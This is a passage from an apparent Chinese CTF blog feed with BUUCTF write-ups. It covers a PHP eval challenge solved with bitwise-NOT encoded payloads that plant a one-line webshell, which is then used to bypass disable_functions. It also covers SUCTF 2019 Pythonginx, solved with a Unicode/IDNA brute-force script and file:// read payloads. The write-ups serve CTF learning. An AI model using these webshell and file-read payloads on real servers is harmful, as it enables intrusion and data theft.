class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，这串简单的代码主要是要绕过 <code>preg_match()</code>  函数，传入的 code 不能有字母和数字，参考这篇文章的绕过：<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p>这里使用异或绕过或者 url 编码取反绕过</p><p>url 编码取反绕过：我们将 php 代码 url 编码后取反，传入的参数在服务端进行 url 编码，由于取反后会变成不可打印字符，这样就达成绕过</p><p>异或绕过：将两个字符的 ASCII 值转化为二进制，进行异或取值从而得到新的二进制字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">字符：? ASCII码：63 二进制： 00‭11 1111‬</span><br><span class="line">字符：~ ASCII码：126 二进制： 0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1 XOR 0 = 1</span><br><span class="line">0 XOR 1 = 1</span><br><span class="line">0 XOR 0 = 0</span><br><span class="line">1 XOR 1 = 0</span><br><span class="line">上述两个字符异或得到 二进制： 0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure><p>先查询一下 phpinfo 看看被禁用的函数，首先需要 url 编码一下传入的参数</p><p>所需传入为 <code>?code=()();</code>  第一个 () 的内容为 phpinfo 第二个 () 让这个 phpinfo 成为一个能使用的函数，将 phpinfo 取反后 url 编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d1.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功得到 phpinfo () 并收集到被禁用的函数，有很多很常用的函数 system、exec 等等</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d2.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>构造一个脚本，传入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># echo urlencode(~&#x27;phpinfo&#x27;);</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;(eval($_POST[a]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6</span></span><br></pre></td></tr></table></figure><p>在这里，我们不能直接使用 eval 因为 eval 并不是 php 函数 所以为我们无法通过变量函数的方法进行调用。<br>在这里，我们使用 assert 来构造，但由于 php 版本问题，我们并不能直接构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[&#x27;a&#x27;]);&gt;</span><br></pre></td></tr></table></figure><p>我们需要调用 eval，拼接为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(eval($_POST[test]))</span><br></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/m0_62879498/article/details/124803318">https://blog.csdn.net/m0_62879498/article/details/124803318</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d4.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>蚁剑连接</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d5.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这题需要执行 readflag 才可以获取 flag，直接使用蚁剑的插件绕过 disable_functions</p><p>配置梯子代理，然后在插件市场下载相关插件</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d6.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="d6"></p><p f2ec14dd-062a-4092-bf94-af14779cdafd>开始， <code>/readflag</code>  得到 flag，flag</p><h2 id="suctf-2019pythonginx"><a class="markdownIt-Anchor" href="#suctf-2019pythonginx">#</a> [SUCTF 2019]Pythonginx</h2><p>看到题目就知道本题是和 nginx 相关，入手点就和 nginx 存放文件的地方相关，做个 nginx 存放文件地方的记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题还给了源码，先审计一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>路由 <code>/getUrl</code> ，GET 和 POST 两种传参方式，重点在三个 if，前两个 if 在匹配到我们传入的参数中存在 <code>suctf.cc</code> ，就会执行 return 语句，导致下面的代码无法执行，第三个 if 语句才有文件读取的操作，所以，需要绕过前两个 if 语句，执行第三个 if 语句，其中第二个 if 和第三个 if 中的 idna 编码 utf-8 解码操作 <code>newhost.append(h.encode('idna').decode('utf-8'))</code>  就是绕过的关键，</p><p><code>encode('idna')</code>  是指转换为国际化域名，这样说肯定不好理解，举个例子：</p><p><code>U:℆  A:c/u  ascii:8454</code>  ，因为 <code>℆</code> 经过编码解码后就是 <code>c/u</code> ，这和我们想要的 <code>**file://suctf.cc/usr/local/nginx/conf/nginx.conf</code> ，这时候 <code>℆</code> 在经过编码解码之后就可以替代 c/u，从而利用这个字符绕过前两个 if 的匹配</p><p>现在需要编写脚本找出可以利用的字符，根据源代码 <code>getUrl()</code>  来编写脚本</p><p>用的大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_unicode</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni = <span class="built_in">chr</span>(i)</span><br><span class="line">        url = <span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="built_in">format</span>(uni)<span class="comment">#修改位置</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(i))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>只要能替换 suctf.cc 里面的任意字母都是可以的修改花括号的位置就可以了，跑一下得出结果</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d7.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure><p>任意选一个替代 c 就好了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://suctf.cⒸ/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d8.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>读取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://suctf.cⒸ/usr/fffffflag</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d9.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/d9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>参考文章：<a href="https://blog.csdn.net/m0_53314778/article/details/113730543%E3%80%81https://blog.csdn.net/RABCDXB/article/details/115451137">https://blog.csdn.net/m0_53314778/article/details/113730543、https://blog.csdn.net/RABCDXB/article/details/115451137</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;安洵杯-2019easy_serialize_php&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#安洵杯-2019easy_serialize_php&quot;&gt;#&lt;/a&gt; [安洵杯 2019] easy_serialize_php&lt;/h2&gt;</summary>
    
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/categories/buuctf/"/>
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>hgame2024_week1_Select_Courses抢课脚本编写学习</title>
    <link href="https://dr4x3zz.github.io/2024/02/15/hgame2024-week1-Select-Courses%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
    <id>https://dr4x3zz.github.io/2024/02/15/hgame2024-week1-Select-Courses%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-15T10:11:07.000Z</published>
    <updated>2024-02-20T15:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="select-courses"><a class="markdownIt-Anchor" href="#select-courses">#</a> Select Courses</h2><span id="more"></span><p>留一下网页 html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span 